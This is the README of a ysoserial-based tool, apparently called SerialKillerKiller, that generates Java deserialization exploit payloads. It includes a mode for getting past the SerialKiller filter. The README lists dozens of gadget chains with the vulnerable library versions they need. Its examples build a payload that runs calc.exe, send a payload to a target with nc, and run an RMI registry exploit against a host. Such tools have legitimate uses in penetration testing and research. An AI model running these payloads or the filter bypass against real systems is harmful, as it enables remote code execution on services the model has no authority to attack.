
# SerialKillerKiller

## Usgae

```shell
$ java -cp target\ysoserial-0.0.6-SNAPSHOT-all.jar serialkillerkiller.Main
SerialKiller Bypass Gadgets
Usage: java -cp target\ysoserial-0.0.6-SNAPSHOT-all.jar serialkillerkiller.Main [payload type] [bypass type] '[command to execute]'
        Available payload types:
                AspectJWeaver [org.aspectj:aspectjweaver:1.9.2, commons-collections:commons-collections:3.2.2]
                BeanShell1 [org.beanshell:bsh:2.0b5]
                C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]
                Click1 [org.apache.click:click-nodeps:2.3.0, javax.servlet:javax.servlet-api:3.1.0]
                Clojure [org.clojure:clojure:1.8.0]
                CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
                CommonsBeanutils2NoCC [commons-beanutils:commons-beanutils:1.9.2, commons-logging:commons-logging:1.2]
                CommonsCollections1 [commons-collections:commons-collections:3.1]
                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections3 [commons-collections:commons-collections:3.1]
                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections5 [commons-collections:commons-collections:3.1]
                CommonsCollections6 [commons-collections:commons-collections:3.1]
                CommonsCollections7 [commons-collections:commons-collections:3.1]
                FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]
                Groovy1 [org.codehaus.groovy:groovy:2.3.9]
                Hibernate1 []
                Hibernate2 []
                JBossInterceptors1 [javassist:javassist:3.12.1.GA, org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
                JRMPClient []
                JRMPListener []
                JSON1 [net.sf.json-lib:json-lib:jar:jdk15:2.4, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2, commons-lang:commons-lang:2.6, net.sf.ezmorph:ezmorph:1.0.6, commons-beanutils:commons-beanutils:1.9.2, org.springframework:spring-core:4.1.4.RELEASE, commons-collections:commons-collections:3.1]
                JavassistWeld1 [javassist:javassist:3.12.1.GA, org.jboss.weld:weld-core:1.1.33.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
                Jdk7u21 []
                Jython1 [org.python:jython-standalone:2.5.2]
                MozillaRhino1 [rhino:js:1.7R2]
                MozillaRhino2 [rhino:js:1.7R2]
                Myfaces1 []
                Myfaces2 []
                ROME [rome:rome:1.0]
                Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
                Spring2 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2]
                URLDNS []
                Vaadin1 [com.vaadin:vaadin-server:7.7.14, com.vaadin:vaadin-shared:7.7.14]
                Wicket1 [org.apache.wicket:wicket-util:6.23.0, org.slf4j:slf4j-api:1.6.4]

        Available bypass types:
                Beanutils1 [commons-beanutils:commons-beanutils:1.0]
```

# ysoserial

## Usage

```shell
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload               Authors                     Dependencies
     -------               -------                     ------------
     AspectJWeaver         @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1            @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                  @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1                @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure               @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1     @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsBeanutils2NoCC @phithon                    commons-beanutils:1.9.2, commons-logging:1.2
     CommonsCollections1   @frohoff                    commons-collections:3.1
     CommonsCollections2   @frohoff                    commons-collections4:4.0
     CommonsCollections3   @frohoff                    commons-collections:3.1
     CommonsCollections4   @frohoff                    commons-collections4:4.0
     CommonsCollections5   @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6   @matthias_kaiser            commons-collections:3.1
     CommonsCollections7   @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1           @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1               @frohoff                    groovy:2.3.9
     Hibernate1            @mbechler
     Hibernate2            @mbechler
     JBossInterceptors1    @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient            @mbechler
     JRMPListener          @mbechler
     JSON1                 @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1        @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21               @frohoff
     Jython1               @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1         @matthias_kaiser            js:1.7R2
     MozillaRhino2         @_tint0                     js:1.7R2
     Myfaces1              @mbechler
     Myfaces2              @mbechler
     ROME                  @mbechler                   rome:1.0
     Spring1               @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2               @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS                @gebl
     Vaadin1               @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1               @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```
